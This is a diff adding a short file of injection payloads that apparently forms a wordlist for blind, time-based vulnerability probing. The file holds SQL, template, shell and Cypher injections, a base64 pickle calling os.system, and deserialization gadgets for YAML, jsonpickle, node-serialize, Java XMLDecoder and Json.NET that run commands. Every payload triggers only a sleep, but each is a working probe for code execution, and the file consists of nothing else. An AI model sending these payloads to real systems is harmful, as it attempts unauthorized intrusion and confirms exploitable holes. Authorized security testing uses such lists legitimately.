@@ -1,0 +1,12 @@
+SLEEP(5)/*'XOR(IF(1=1,SLEEP(5),0))OR'"XOR(IF(1=1,SLEEP(5),0))OR"*/
+{{__import__('time').sleep(5)}}${T(java.lang.Thread).sleep(5000)}<%= sleep(5) %>${{T(java.lang.Thread).sleep(5000)}}
+;sleep 5 #'|sleep 5|"$(sleep 5)`sleep 5`
+__import__('time').sleep(5)
+' OR 1=1 WITH 1 AS x CALL apoc.util.sleep(5000) RETURN x //
+Thread.sleep(5000)
+Y29zCnN5c3RlbQooUydzbGVlcCA1Jwp0Ui4=
+!!python/object/apply:os.system ["sleep 5"]
+{"py/reduce":[{"py/function":"time.sleep"},{"py/tuple":[5]}]}
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 5')}()"}
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.Thread" method="sleep"><long>5000</long></object></java>
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c timeout 5"}}}
